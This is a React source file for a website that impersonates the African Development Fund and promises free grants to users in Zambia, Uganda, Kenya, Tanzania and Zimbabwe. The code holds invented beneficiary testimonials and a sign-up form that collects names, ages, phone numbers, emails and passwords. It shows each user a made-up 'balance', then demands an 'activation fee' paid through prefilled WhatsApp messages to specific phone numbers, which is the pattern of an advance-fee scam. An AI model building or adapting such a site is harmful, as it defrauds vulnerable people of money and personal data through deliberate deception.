import "./App.css";
import { useEffect, useReducer, useState } from "react";

const questions = [
  {
    quiz: "Which line are you using in this Application",
    option: ["1.MTN", "2.AIRTEL", "Tigo", "Safaricom", "Vodacom", "Zamtel"],
    id: 1,
  },

  {
    quiz: "ACCORDING TO OUR ORGANIZATION OFFER, WE NEED TO KNOW YOUR PLANS WITH THIS FUNDS",
    option: [
      "1.Emergencies",
      "2.Start a business",
      "3.Pay debts",
      "4.Pay school fees",
      "Others",
    ],
    id: 2,
  },
];

const ugandaOption = [
  {
    quiz: "Congratulations you Qualify for the following limit/Offers. 💥☑Which promotion are you capable To pay for it's activation fee?",
    option: [
      {
        type: "1:_UGX 25,000..........._UGX900,000",
        activation: "25,000",
        amount: "900,000",
      },
      {
        type: "2:_UGX 50,000.........._UGX 1,500,000",
        activation: "50,000",
        amount: "1,500,000",
      },
      {
        type: "3:_UGX 150,000.........._UGX 2,00,000",
        activation: "150,000",
        amount: "2,000,000",
      },
      {
        type: "4:_UGX 200,000.........._UGX 2,500,000",
        activation: "200,000",
        amount: "2,500,000",
      },
      {
        type: "5:_UGX 250,000........._UGX 3,000,000",
        activation: " 250,000",
        amount: "3,000,000",
      },
      {
        type: "6:_UGX 300,000........._UGX 3,500,000",
        activation: "300,000",
        amount: "3,500,000",
      },
    ],
    id: 3,
  },
];

const moneyoption = [
  {
    quiz: "Congratulations you Qualify for the following limit/Offers. 💥☑Which promotion are you capable of paying it's activation fee?",
    option: [
      {
        type: "1:_ZMW 350...........ZMW 7,000",
        activation: 350,
        amount: "7,000",
      },
      {
        type: "2:_ZMW 450..........ZMW 10,000",
        activation: 450,
        amount: "10,000",
      },
      {
        type: "3:_ZMW 650..........ZMW 15,000",
        activation: 650,
        amount: "15,000",
      },
      {
        type: "4:_ZMW 850..........ZMW 20,000",
        activation: 850,
        amount: "20,000",
      },
      {
        type: "5:_ZMW 1050.........ZMW 25,000",
        activation: 1050,
        amount: "25,000",
      },
      {
        type: "6:_ZMW 1250.........ZMW 30,000",
        activation: 1250,
        amount: "30,000",
      },
    ],
    id: 3,
  },
];

const people = [
  {
    name: "Marry Choongo",
    age: 34,
    country: "zambia",
    message: "I am so gratefull, I received ZMW 25,000",
    id: 1,
  },
  {
    name: "Peter lekwom",
    age: 49,
    country: "Tanzania",
    message: "Nimepokea 2,400,000, I ninashukuru sana",
    id: 2,
  },
  {
    name: "Gladies Nzima",
    age: 42,
    country: "kenya",
    message: "Thanks so much guys, Ksh 55,000 is much",
    id: 3,
  },
  {
    name: "Boas indoren,",
    age: 37,
    country: "Congo",
    message: "This is what we want in the society, Thanks",
    id: 4,
  },
  {
    name: "Cleobus Matwau",
    age: 31,
    country: "Tanzania",
    message:
      "Naweza Anza biashara, Asante sana nimeshuru, tsh 2,000,000 mfukoni.",
    id: 5,
  },
  {
    name: "Pius Chiloba",
    age: 38,
    country: "Zimbabwe",
    message:
      "USD 650 i am very thankfull for this coming through, apply if you haven't",
    id: 6,
  },
  {
    name: "Ainamokisha Timothy",
    age: 68,
    country: "Uganda",
    message:
      " I received  1,825,000 ugx, this is very real, i did belive at first",
    id: 7,
  },
  {
    name: "Jane Ithuka",
    age: 22,
    country: "Kenya",
    message: "My fellow kenyans apply for this money, i received 85,000",
    id: 8,
  },
  {
    name: "Beatrice Namonga",
    age: 53,
    country: "Uganda",
    message:
      "I just received ugx 2,650,000, peolple should Aplly for this funds",
    id: 9,
  },
];

export default function Prom() {
  const [home, setHome] = useState(true);
  const [hometwo, setHometwo] = useState(false);
  const [register, setRegister] = useState(false);
  const [land, setLand] = useState(false);
  const [landd, setLandd] = useState(true);
  const [users, setUsers] = useState({});
  const [userIn, setuserIn] = useState(false);
  const [balance, setbBlance] = useState(0);
  const [activate, setActivation] = useState(0);
  const [currency, setcurrency] = useState("");
  const [menuOpen, setmenuOpen] = useState(false);
  const [accOpen, setaccOpen] = useState(false);

  function setUserCurrency() {
    console.log(users.country);
    switch (users.country) {
      case "Zambia": {
        return setcurrency("ZMW");
      }
      case "Kenya": {
        return setcurrency("KSH");
      }
      case "Uganda": {
        return setcurrency("UGX");
      }
      case "Tanzania": {
        return setcurrency("TSH");
      }
      case "zimbabwe": {
        return setcurrency("USD");
      }

      default:
        throw new Error("Action unknown");
    }
  }

  function createUser(user) {
    setUsers(user);
    // setUsers((user) => [...users, user]);
  }
  // console.log(users.userEmail);

  function handleSetHome() {
    setHome(false);
    setHometwo(true);
  }

  function handleRegistration() {
    setRegister(true);
    setHometwo(false);
  }

  function handleLnding() {
    setRegister(false);
    setLand(true);
  }

  function handleLand() {
    setLandd(false);
    setUserCurrency();
  }
  function onuserIn() {
    setuserIn(true);
  }
  function handleSetBalance(bal, acti) {
    setbBlance(bal);
    setActivation(acti);
  }
  function onMenuOpen() {
    setmenuOpen(menuOpen === false ? true : false);
  }
  function handleAccCenter() {
    setaccOpen(accOpen === false ? true : false);
  }
  const [Kiswahili, setKiswahili] = useState(true);
  function onkiswahili() {
    setKiswahili(Kiswahili === true ? false : true);
  }

  const [currentperson, setcurrentperson] = useState(1);
  const [blink, setBlink] = useState(true);
  const [transacImg, settransacImg] = useState(false);

  useEffect(() => {
    const interval = setInterval(() => {
      setcurrentperson((prevId) => (prevId + 1) % people.length);
      settransacImg(settransacImg === false ? true : false);
    }, 3000);

    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const interval2 = setInterval(() => {
      setBlink(blink === true ? false : true);
    }, 2000);
    return () => clearInterval(interval2);
  }, [blink]);
  return (
    <div className="prom-container">
      <div>
        <div className="top_nav">
          <button onClick={onMenuOpen} className="nav_btn">
            <ion-icon name="menu-outline"></ion-icon>
          </button>

          <button className="nav_btn" onClick={handleAccCenter}>
            {" "}
            <ion-icon name="person-outline"></ion-icon>
            <span>{userIn ? users.name : "Account"}</span>
          </button>
          <AccountCenter
            custoName={users}
            userIn={userIn}
            accOpen={accOpen}
            handleAccCenter={handleAccCenter}
          />
          {}
          <MenuSide menuOpen={menuOpen} user={users} onsetmenu={onMenuOpen} />
        </div>
        <Promlogo userIn={userIn} />
        <div className="header">
          <h2 className="heading">AFRICAN DEV'T FUNDS</h2>
          <p style={{ color: "rgb(68, 183, 55)" }}>
            Apply now, Receive Funds now
          </p>
        </div>

        {home ? (
          <div>
            <div className="wellcome_text">
              {/* <p>language/Lugha👉</p>
              <button onClick={onkiswahili}>
                {!Kiswahili ? "Kiswahili" : "English"}
              </button> */}
            </div>
            <div className="promtext">
              <img src="/prom2.jpg" alt="pron" />
              {Kiswahili ? (
                <p style={{ margin: "1rem" }}>
                  The African Development Fund (ADF) contributes to the
                  promotion of economic and social development in least
                  developed African countries by providing concessional funding
                  for projects and programs, as well as technical assistance for
                  studies and capacity-building activities.
                </p>
              ) : (
                <p>
                  Mfuko wa Maendeleo ya Afrika (ADF) unachangia kukuza maendeleo
                  ya kiuchumi na kijamii katika nchi za Afrika zilizoendelea
                  kidogo kwa kutoa ufadhili wa msaada kwa miradi na mipango,
                  pamoja na usaidizi wa kiufundi kwa ajili ya utafiti na
                  shughuli za kujenga uwezo.
                </p>
              )}
              {/* {transacImg ? (
                <>
                  hello
                  <img src="/transac.jpg" alt="pron" />
                </>
              ) : (
                <img src="/transac2.jpg" alt="pron" />
              )} */}
            </div>
            <div className="person">
              <>
                <h4>Beneficiaries/ Waliyonufaika </h4>
                {people.map((person, index) =>
                  person.id === currentperson ? (
                    <div>
                      <hr></hr>
                      <h3>{person.name}</h3>
                      <p>Age: {person.age} Years</p>
                      <p>From: {person.country}</p>
                      <p>{person.message}</p>
                    </div>
                  ) : (
                    ""
                  )
                )}
              </>
            </div>
            <div className="wwhatsapp" style={{ backgroundColor: "inherit" }}>
              {!Kiswahili ? (
                <p>Bonyeza kiungo cha WhatsApp hapa chini kuomba sasa!</p>
              ) : (
                <p style={{ padding: "1rem", borderRadius: "6px" }}>
                  Click the link below to apply on the website now! or through
                  WhatsApp
                </p>
              )}
              <button
                style={{ marginTop: "2rem", padding: "1.4rem" }}
                className="btn_apply"
                onClick={handleSetHome}
              >
                Apply Now
              </button>
              <a
                href="https://wa.me/message/HKUI4RPAQTKMH1"
                className="whatsapp"
                style={{ marginBottom: "2rem" }}
              >
                {blink ? (
                  <p style={{ backgroundColor: "inherit", color: "black" }}>
                    whatApp
                  </p>
                ) : (
                  <p style={{ backgroundColor: "inherit" }}>whatApp</p>
                )}
              </a>
            </div>
          </div>
        ) : (
          ""
        )}
      </div>

      <ChoosingOption home={hometwo} onregister={handleRegistration} />
      <Registration
        register={register}
        setRegister={setRegister}
        onland={handleLnding}
        onuserIn={onuserIn}
        createUser={createUser}
      />
      <LandingPage
        land={land}
        currency={currency}
        landd={landd}
        onlandd={handleLand}
        custoName={users}
        balance={balance}
        activate={activate}
        setUserCurrency={setUserCurrency}
        onSetbalance={handleSetBalance}
      >
        <Quizes />
      </LandingPage>
      {/* <MenuSide menuOpen={menuOpen} /> */}
    </div>
  );
}

function AccountCenter({ custoName, userIn, accOpen, handleAccCenter }) {
  const { name } = custoName;

  return (
    <>
      <div
        className={`account_container ${accOpen ? "" : "hideAccCenter"}`}
        onClick={handleAccCenter}
      >
        {!userIn ? (
          <div className="accoption">
            <button>Create Account</button>
            <button>
              Login <ion-icon name="log-in-outline"></ion-icon>
            </button>
          </div>
        ) : (
          <div className="myAccoOPt">
            <span>
              <ion-icon name="person-circle-outline"></ion-icon>
            </span>
            <h2>{name}</h2>
            <button>
              Logout <ion-icon name="log-out-outline"></ion-icon>
            </button>
          </div>
        )}
      </div>
    </>
  );
}

function MenuSide({ user, menuOpen, onsetmenu }) {
  const { country, age, name, userPhoneNum, userEmail } = user;
  const [profi, setProfi] = useState(false);
  const [help, setHelp] = useState(false);

  function hndleProfi() {
    setProfi(true);
    setHelp(false);
  }
  function hndleHelp() {
    setHelp(true);
    setProfi(false);
  }
  return (
    <>
      <div className={`menu_containerr ${menuOpen ? "" : "hide_menuside"}`}>
        <div className="menu_header">
          <h2>DASHBORD</h2>
          <button onClick={onsetmenu}>
            <ion-icon name="close-circle-outline"></ion-icon>
          </button>
        </div>
        <button onClick={hndleProfi}>
          Profile <ion-icon name="person-circle-outline"></ion-icon>
        </button>
        <button onClick={hndleHelp}>
          Help <ion-icon name="help-circle-outline"></ion-icon>
        </button>
        <button>Rate us ⭐</button>
        <button>About us</button>
        <button>
          Invite People <ion-icon name="people-outline"></ion-icon>
        </button>
        <div className="menu_display">
          {profi ? (
            <>
              {user.name !== undefined ? (
                <div className="plofile_info">
                  <h2>
                    <strong>Name</strong>: {name}
                  </h2>
                  <p>
                    <strong>Age</strong>: {age} years
                  </p>
                  <p>
                    <strong>Number</strong>: {userPhoneNum}
                  </p>
                  <p>
                    <strong>Email</strong>: {userEmail}
                  </p>
                  <p>
                    <strong>Country</strong>: {country}
                  </p>
                </div>
              ) : (
                <h1
                  style={{
                    width: "fit-content",
                    margin: "auto auto",
                    textAlign: "center",
                  }}
                >
                  Login or Create Account
                </h1>
              )}
            </>
          ) : (
            ""
          )}

          {help ? (
            <div>
              <a
                href="https://api.whatsapp.com/send?phone=254735011774&text=Hello!%20I'd%20like%20your%20PROMOTION"
                className="whatsapp"
              >
                WHATSAPP
                {/* <ion-icon name="logo-whatsapp"></ion-icon> */}
              </a>
            </div>
          ) : (
            ""
          )}
        </div>
      </div>
    </>
  );
}

function Promlogo({ userIn }) {
  return (
    <>
      {!userIn ? (
        <img src="/prologo.jpg" className="prom_logo" alt="prologo" />
      ) : (
        ""
      )}
    </>
  );
}

function ChoosingOption({ home, onregister }) {
  return (
    <div>
      {home ? (
        <div className="home2">
          <p>Millions of People have already received This Funds</p>
          <span>Note that this Are not Loan they are Donations/Free</span>
          <h5 style={{ marginBottom: "1rem" }}>
            Create Account or Login If You have an Account
          </h5>
          <button className="btn_apply" onClick={onregister}>
            Create Account
          </button>
          <button
            className="btn_apply"
            style={{ backgroundColor: "rgba(190, 175, 175, 0.616)" }}
          >
            Login to your Account
          </button>
        </div>
      ) : (
        ""
      )}
    </div>
  );
}

function Registration({ register, setRegister, onland, createUser, onuserIn }) {
  return (
    <>
      {register ? (
        <div className="registration_container">
          <Form
            Onsubmission={createUser}
            register={register}
            setRegister={setRegister}
            onland={onland}
            onuserIn={onuserIn}
          />
        </div>
      ) : (
        " "
      )}
    </>
  );
}

function Form({
  register,
  setRegister,
  Onsubmission,
  onsetName,
  onland,
  onuserIn,
}) {
  const [userEmail, setUserEmail] = useState("");
  const [name, setName] = useState("");
  const [age, setAge] = useState("");
  const [password, setPassword] = useState("");
  const [country, setCountry] = useState("");
  const [userPhoneNum, setUserPhoneNum] = useState("");
  const [noData, setnoData] = useState(false);
  const [noNumber, setnoNumber] = useState(false);

  // function hi() {
  //   userPhoneNum.length > 0 ? setnoNumber(true) : setnoNumber(false);
  // }

  function handleOnsubmit(e) {
    e.preventDefault();

    if (!userEmail) {
      setnoData(true);
    }
    if (!userPhoneNum) {
      setnoNumber(true);

      return;
    }
    if (country === "") return;

    const createUser = {
      name,
      age,
      userEmail,
      country,
      userPhoneNum,
    };

    Onsubmission(createUser);
    onland();
    onuserIn();
  }

  return (
    <>
      <form className="regis_form" onSubmit={handleOnsubmit}>
        <label>
          Name <span> (Two)</span>
        </label>
        <input
          type="text"
          value={name}
          onChange={(e) => setName(e.target.value)}
        />
        <label>Age</label>
        <input
          type="number"
          value={age}
          onChange={(e) => setAge(e.target.value)}
        />
        <label>Phone number</label>
        <input
          type="country"
          name="phoneNUmber"
          value={userPhoneNum}
          onChange={(e) => setUserPhoneNum(e.target.value)}
        />
        <label>Email </label>
        <input
          type="email"
          value={userEmail}
          onChange={(e) => setUserEmail(e.target.value)}
        />
        <p className={`error_p ${noData ? "" : "err"}`}>Email valid email</p>

        {/* {userPhoneNum.length > 1 && userPhoneNum.length < 11 ? (
          <p className="error_p">invalid phone number</p>
        ) : (
          <p className={`error_p ${noNumber ? "" : "err"}`}>
            {userPhoneNum < 11
              ? "invalid phone number"
              : " phone number is required"}
          </p>
        )} */}
        <label>Password </label>
        <input
          type="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />

        <select
          className="select_country"
          value={country}
          onChange={(e) => setCountry(e.target.value)}
        >
          <option>Choose Your Country</option>
          <option value="Zambia">Zambia</option>
          <option value="Uganda">Uganda</option>
          <option value="Kenya">Kenya</option>
          <option value="Tanzania">Tanzania</option>
          <option value="Tanzania">Zimbabwe</option>
        </select>
        <button type="submit">Continue</button>
      </form>
    </>
  );
}

function LandingPage({
  setUserCurrency,
  land,
  landd,
  onlandd,
  custoName,
  userIn,
  balance,
  onSetbalance,
  currency,
  activate,
}) {
  const { name, country } = custoName;
  const [Finish, setFinish] = useState(false);
  function onFinish() {
    setFinish(true);
  }
  return (
    <>
      {land ? (
        <div className="landing_page">
          <ProfileCusto
            currency={currency}
            name={name}
            balance={balance}
            country={country}
            userIn={userIn}
          />
          {landd ? (
            <>
              {" "}
              <h6 style={{ fontSize: "2.4rem" }}>
                Congratulations for Creating Account Succefully you are Ready to
                start application{" "}
              </h6>
              {/* <h4> Welcome {name} you are Ready to start applicatio </h4> */}
              <p style={{ fontSize: "2.2rem" }}>
                Your have been reqistered <strong>successfully</strong> in our
                funding Programme. Now you are required to answer few
                questions,and at the end you are also required to choose the
                amount of Funds that you need, Thank You.
              </p>
              <button onClick={onlandd} style={{ borderRadius: "8px" }}>
                <strong>CONTINUE</strong>
              </button>
            </>
          ) : (
            <>
              {!Finish ? (
                <Quizes
                  onSetbalance={onSetbalance}
                  onFinish={onFinish}
                  balance={balance}
                  custoName={custoName}
                />
              ) : (
                <CongratsMessage
                  activate={activate}
                  currency={currency}
                  balance={balance}
                  custoName={custoName}
                />
              )}{" "}
            </>
          )}
        </div>
      ) : (
        ""
      )}
    </>
  );
}

function ProfileCusto({ name, country, balance, currency }) {
  return (
    <div className="Userin">
      <div className="custo_container">
        <div className="custoprof">
          {/* <div className="profilecusto">
            <ion-icon name="person-circle-outline"></ion-icon>
            <span>
            <ion-icon name="checkmark-circle-outline"></ion-icon>
            </div> 
            </span> */}
          <h2>{name}</h2>
          <p className="countrye">Country: {country}.</p>
          <span>
            Balance:{" "}
            <strong>
              {currency} {balance}
            </strong>
          </span>
        </div>
        {/* <p>Welcome your Account is Ready</p> */}
      </div>
      <div>
        <img src="/prologo.jpg" className="prom_logo2" alt="prologo" />
        <p></p>
      </div>
    </div>
  );
}

function CongratsMessage({ balance, currency, custoName, activate }) {
  const { name, age, userEmail, userPhoneNum, country } = custoName;
  const encodedmessge =
    encodeURIComponent(`Hello ADF, My name is ${name} ${age} years old from ${country}, Email: ${userEmail}. I am here to claim my PROMOMITION Funds of ${currency} ${balance}. I am ready to complete the process by paying the activition fee of ${currency} ${activate}.
     `);

  const whatAppURL = `https://wa.me/+254736227246?text=${encodedmessge}`;
  return (
    <div className="congra_message">
      <h2> CONGRATULATIONS FOR COMPLETING THE PROCESS</h2>
      <div>
        <div className="userdetails">
          <p>
            {" "}
            NAME: <strong>{name}.</strong>
          </p>
          <p>
            PHONE NUMBER:<strong> {userPhoneNum}.</strong>
          </p>
          <p>
            EMAIL:<strong> {userEmail}.</strong>{" "}
          </p>
          <p>
            COUNTRY:<strong> {country}.</strong>
          </p>
          <p>
            ACC BALANCE:
            <strong>
              {" "}
              {currency} {balance}.
            </strong>
          </p>
        </div>
        <p>
          You are now registered as a permanent beneficiary of AFRICAN
          DEVELOPMENT BANK. ✅ You are about to receive {currency} {balance}{" "}
          𝒇𝒓𝒐𝒎 OUR <i>FUNDING PROGRAMME</i>. We thereby congratulate you for
          contacting and making your application🎉. Ensure to use these money in
          an Growthfull/development Way.{" "}
        </p>
        <p className="askmoney_p">
          {" "}
          <strong>
            📌Now you are required pay{" "}
            <strong>
              {currency} {activate}
            </strong>{" "}
            for activation fee and immediately receive Activation code to unlock
            your promotion Awards Funds
          </strong>
        </p>
        <p>
          𝕔𝕠𝕟𝕘𝕣𝕒𝕥𝕦𝕝𝕒𝕥𝕚𝕠𝕟 🎁To continue click the whatsapp link below to reach to
          agent on whatApp who will guide you on how to activate your Awards
          within 10 MINUTES. Your promotion is to be dispersed to your line
          within 10 minutes after Activation.
        </p>
      </div>
      <p>
        <strong>
          NOW click the whatApp below to be guided and receive funds in 10
          minutes time. NOTE: Don't change the message on whatApp. Thank You🙏.
        </strong>
      </p>

      <a href={whatAppURL} className="whatsapp">
        <ion-icon name="logo-whatsapp"></ion-icon>
      </a>
    </div>
  );
}

function Quizes({ balance, onSetbalance, onFinish, custoName }) {
  const [currentId, setCurrentId] = useState(1);
  const [selectedIndex, setSelectedIndex] = useState(null);
  const [nextactive, setnextacti] = useState(null);
  const [price, setprice] = useState(false);
  const { country } = custoName;

  const selected = {
    boxShadow: " 5px 5px 10px 0 rgba(0, 0, 0, 0.3)",
  };

  useEffect(
    function () {
      function myprice() {
        if (currentId > 2) setprice(true);
      }
      myprice();
    },
    [currentId]
  );

  function handleCurrentID() {
    setCurrentId(currentId + 1);
    setSelectedIndex(null);
    setnextacti(null);
  }
  function handleSelected(index) {
    setSelectedIndex(index);
    setnextacti(1);
  }

  return (
    <div className="myQuizes">
      {!price ? (
        <>
          {questions.map((quiz) =>
            quiz.id === currentId ? (
              <div key={quiz.id}>
                <h4>{quiz.quiz}</h4>
                {quiz.option.map((opt, index) => (
                  <button
                    key={index}
                    onClick={() => handleSelected(index)}
                    className={` ${
                      selectedIndex === index ? "select_btn" : ""
                    }`}
                  >
                    {opt}
                  </button>
                ))}
              </div>
            ) : (
              ""
            )
          )}
          <button
            onClick={handleCurrentID}
            className="btn_next"
            disabled={!nextactive}
            style={{
              backgroundColor: "rgb(11, 11, 45)",
              color: "white",
              width: "8rem",
              fontWeight: "bold",
              marginLeft: "74%",
              alignSelf: "right",
            }}
          >
            Next
          </button>
        </>
      ) : (
        <>
          {country === "Uganda" ? (
            <>
              {ugandaOption.map((quiz) => (
                <div key={quiz.id}>
                  <h4>{quiz.quiz}</h4>
                  {quiz.option.map((opt, index) => (
                    <button
                      key={index}
                      onClick={(e) =>
                        onSetbalance(e.target.value, opt.activation)
                      }
                      value={opt.amount}
                      className={`${
                        balance === opt.amount ? "select_btn" : ""
                      }`}
                    >
                      {opt.type}
                    </button>
                  ))}
                </div>
              ))}{" "}
            </>
          ) : (
            <>
              {moneyoption.map((quiz) => (
                <div key={quiz.id}>
                  <h4>{quiz.quiz}</h4>
                  {quiz.option.map((opt, index) => (
                    <button
                      key={index}
                      onClick={(e) =>
                        onSetbalance(e.target.value, opt.activation)
                      }
                      value={opt.amount}
                      className={`${
                        balance === opt.amount ? "select_btn" : ""
                      }`}
                    >
                      {opt.type}
                    </button>
                  ))}
                </div>
              ))}{" "}
            </>
          )}
          <button
            onClick={onFinish}
            className="btn_next"
            disabled={!balance}
            style={{
              backgroundColor: "rgba(19, 222, 29, 1)",
              color: "white",
              width: "15rem",
              fontWeight: "bold",
              marginLeft: "54%",
              alignSelf: "right",
            }}
          >
            CLAIM NOW
          </button>
        </>
      )}
    </div>
  );
}

function RegistrationLogo() {
  return (
    <>
      <div className="logo">
        <img src="/korir.jpg" className="logo-img" alt="korir" />
      </div>
      <h3 className="logo_heading">Create account at korir Ecommerce</h3>
    </>
  );
}
